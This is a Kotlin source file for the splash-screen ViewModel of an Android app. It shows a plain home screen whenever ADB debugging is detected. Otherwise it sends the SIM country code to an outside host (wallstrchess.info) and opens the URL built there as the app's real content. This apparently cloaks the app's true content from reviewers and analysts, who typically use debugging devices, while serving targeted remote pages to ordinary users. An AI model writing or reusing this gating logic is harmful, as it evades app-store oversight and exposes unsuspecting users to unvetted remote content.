package com.rab.bit.road105.ui.screens.splash

import android.content.Context
import android.telephony.TelephonyManager
import android.util.Log
import androidx.lifecycle.ViewModel
import androidx.lifecycle.viewModelScope
import com.rab.bit.road105.model.data.LoadingState
import com.rab.bit.road105.model.repo.DataStoreRepository
import com.rab.bit.road105.model.repo.NetworkCheckerRepository
import com.rab.bit.road105.util.AimBuilder
import dagger.hilt.android.lifecycle.HiltViewModel
import kotlinx.coroutines.flow.MutableStateFlow
import kotlinx.coroutines.flow.StateFlow
import kotlinx.coroutines.launch
import javax.inject.Inject

@HiltViewModel
class SplashViewModel @Inject constructor(
    private val networkCheckerRepository: NetworkCheckerRepository,
    private val dataStore: DataStoreRepository
) : ViewModel() {

    private val mutableLiveState = MutableStateFlow<LoadingState>(LoadingState.InitState)
    val liveState: StateFlow<LoadingState> = mutableLiveState

    fun load(context: Context) {
        viewModelScope.launch {
            val network = networkCheckerRepository.isConnectionAvailable()
            val adbFromStorage = dataStore.getAdb()

            if (network) {
                if (adbFromStorage == null) {
                    val adbDetected = networkCheckerRepository.isAdbEnabled(context)
                    dataStore.saveAdb(adbDetected)

                    if (adbDetected) {
                        mutableLiveState.emit(LoadingState.HomeState)
                    } else {
                        proceedWithContent(context)
                    }
                } else {
                    if (adbFromStorage) {
                        mutableLiveState.emit(LoadingState.HomeState)
                    } else {
                        proceedWithContent(context)
                    }
                }
            } else {
                mutableLiveState.emit(LoadingState.NoNetworkState)
            }
        }
    }

    private suspend fun proceedWithContent(context: Context) {
        val urlFromStorage = dataStore.getUrl()
        if (urlFromStorage == EMPTY) {
            val telephonyManager =
                context.getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager
            val countryCode = telephonyManager.simCountryIso.toString()
            val url = AimBuilder()
                .setCountryCode(countryCode)
                .build("https://wallstrchess.info/Cj5ny2NT2")
            dataStore.saveUrl(url)
            Log.v("123123", url)
            mutableLiveState.emit(LoadingState.ContentState(url = url))
        } else {
            mutableLiveState.emit(LoadingState.ContentState(url = urlFromStorage))
        }
    }

    companion object {
        private const val EMPTY = "EMPTY"
    }
}
